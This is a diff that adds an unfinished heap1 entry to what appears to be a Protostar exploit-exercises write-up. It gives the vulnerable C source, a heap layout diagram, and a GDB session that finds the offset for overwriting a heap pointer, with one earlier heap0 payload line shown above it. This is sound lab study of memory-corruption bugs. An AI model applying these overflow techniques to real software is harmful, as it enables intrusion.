@@ -1466,4 +1466,121 @@ python -c "print 'a'*0x48 + '\x64\x84\x04\x08' "
 ./heap0 $(python -c "print 'a'*0x48+'\x64\x84\x04\x08'")
 ```
 
+##heap1
+---------------------------------------
+###source:
+```C
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdio.h>
+#include <sys/types.h>
 
+  
+
+struct internet {
+  int priority;
+  char *name;
+};
+
+void winner()
+{
+  printf("and we have a winner @ %d\n", time(NULL));
+}
+
+int main(int argc, char **argv)
+{
+  struct internet *i1, *i2, *i3;
+
+  i1 = malloc(sizeof(struct internet));  //8
+  i1->priority = 1;
+  i1->name = malloc(8);
+
+  i2 = malloc(sizeof(struct internet));  //8 
+  i2->priority = 2;
+  i2->name = malloc(8);
+
+  strcpy(i1->name, argv[1]);
+  strcpy(i2->name, argv[2]);
+
+  printf("and that's a wrap folks!\n");
+}
+```
+###Plan:
+So we see we're strcpying some data into internet.name which are both allocated 8 bytes. Our heap looks something like this
+```asm
+lower addr
++----------------------+\
+|    i1.priority =1    |  \   
++----------------------+    \    chunk1       
+|     *i1.name         |     /
++----------------------+   /
+|      ARGV1(8)        | /     <--- FIRST STRCPY
+|                      |
++----------------------+
+|    i2.priority =2    |\
++----------------------+  \
+|    i2.*name          |    \
++----------------------+       chunk2
+|      ARGV2(8)        |    /
+|                      |  /    <----- SECOND STRCPY
++----------------------+/ 
+higher addr
+```
+That means if we overwrite the pointer to name in i2, we can write strcpy data anywhere we want.
+Lets take a look with GDB
+```bash
+gdb ./heap1
+Reading symbols from ./heap1...done.
+gdb$ disas main
+...
+   0x08048552 <+153>:   mov    %eax,(%esp)
+   0x08048555 <+156>:   call   0x804838c <strcpy@plt>  <--- put breakpoint on strcpy call
+   0x0804855a <+161>:   movl   $0x804864b,(%esp)
+   0x08048561 <+168>:   call   0x80483cc <puts@plt> 
+   0x08048566 <+173>:   leave  
+   0x08048567 <+174>:   ret    
+End of assembler dump.
+gdb$ b *0x08048555
+Breakpoint 1 at 0x8048555: file heap1/heap1.c, line 32.
+gdb$ run aaaaaaaa
+Breakpoint 1, 0x08048555 in main (argc=0x2, argv=0xffffd164) at heap1/heap1.c:32
+32      heap1/heap1.c: No such file or directory.
+gdb$ x/40wx $eax-40      
+0x8049ff8:      0x00000000      0x00000000      0x00000000      0x00000011  <-- our heap
+0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
+0x804a018:      0x61616161      0x61616161      0x00000000      0x00000011  <input begins
+0x804a028:      0x00000002      0x0804a038      0x00000000      0x00000011
+                                    ^-------------------pointer to name, we need to overwrite this
+...
+gdb$ p 0x804a028+0x4  #get location of name ptr on heap
+$1 = 0x804a02c
+gdb$ p $1-0x804a018   #subtract the beginning of our input
+$2 = 0x14             #offset
+  #now lets try it out
+gdb$ run $(python -c "print 'a'*0x14+'xxxx'")
+Starting program: /home/ubuntu/workspace/exploit-exercises/protostar/binaries/heap1 $(python -c "print 'a'*0x14+'xxxx'")
+--------------------------------------------------------------------------[regs]
+  EAX: 0x78787878  EBX: 0xF7FC1000  ECX: 0xFFFFD390  EDX: 0x00000000  o d I t S z a P c 
+  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xFFFFD0B8  ESP: 0xFFFFD090  EIP: 0x08048555
+  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002B
+--------------------------------------------------------------------------[code]
+=> 0x8048555 <main+156>:        call   0x804838c <strcpy@plt>                      #as you can see we're about to call strcpy 
+   0x804855a <main+161>:        mov    DWORD PTR [esp],0x804864b                   # on 0x78787878 or 'xxxx'
+   0x8048561 <main+168>:        call   0x80483cc <puts@plt>
+   0x8048566 <main+173>:        leave  
+   0x8048567 <main+174>:        ret    
+   0x8048568:   nop
+   0x8048569:   nop
+   0x804856a:   nop
+--------------------------------------------------------------------------------
+```
+Now we just have to figure out how we want to use this.
+TBC
+
+###winning command:
+```bash
+```
+###Python exploit:
+```Python
+```
